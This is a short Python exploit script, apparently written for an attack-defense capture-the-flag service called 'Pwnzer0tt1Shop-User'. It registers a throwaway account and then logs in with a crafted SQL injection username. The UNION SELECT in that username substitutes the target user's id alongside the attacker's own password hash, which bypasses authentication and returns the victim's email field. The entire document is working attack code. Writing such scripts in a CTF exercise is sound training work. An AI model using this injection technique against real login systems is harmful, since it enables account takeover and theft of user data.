#!/usr/bin/env python3

class config:
    service = "Pwnzer0tt1Shop-User"
    #CHANGE ME!!!!
    team_token = "token"
    my_team_ip = "10.60.team_id.1"

import secrets
from _pwnshop_utils import PwnShopClient

def attack(team_ip: str, flag_id):
    client = PwnShopClient(team_ip)
    
    psw_hash_user = secrets.token_hex(10)
    fake_password = secrets.token_hex(10)
    client.register_user(psw_hash_user, fake_password, secrets.token_hex(10))
    client.logout_user()
    
    return client.login_user(f"' AND 1=0 UNION SELECT (SELECT id FROM user WHERE username = '{flag_id["username"]}'), (SELECT password FROM user WHERE username = '{psw_hash_user}') -- ", fake_password)["email"]
